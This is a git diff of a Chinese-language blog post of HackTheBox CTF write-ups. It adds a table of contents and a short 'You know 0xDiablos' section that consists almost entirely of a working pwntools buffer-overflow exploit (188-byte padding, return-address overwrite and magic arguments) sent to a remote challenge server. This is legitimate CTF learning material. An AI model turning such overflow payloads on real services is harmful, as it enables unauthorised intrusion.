@@ -1,12 +1,20 @@
 ---
 layout: post
-title: "hackbox pwn racecar wp"
+title: "hackbox wp"
 date:   2022-3-10
 tags: [ctf_wp]
 comments: true
 author: wsxk
 ---
 
+
+- [racecar](#racecar)
+  - [1.运行](#1运行)
+  - [2.分析程序](#2分析程序)
+  - [3.exp编写](#3exp编写)
+- [You know 0xDiablos](#you-know-0xdiablos)
+
+## racecar<br>
 ### 1.运行
 拿到文件，当然是先让他跑起来看看会发生什么
 
@@ -96,3 +104,18 @@ author: wsxk
             break
     print(true_flag)
 
+## You know 0xDiablos<br>
+太简单了以至于不想说乍做.....<br>
+
+    from pwn import *
+
+    io = remote("167.172.60.97",31012)
+    #io = process("./vuln")
+    #80491E2
+    io.recvuntil("You know who are 0xDiablos:")
+    payload = b'a'*188 + p32(0x80491E2)+p32(0xDEADBEEF)+p32(0xDEADBEEF)+p32(0xC0DED00D)
+
+    #gdb.attach(io)
+    io.sendline(payload)
+
+    io.interactive()
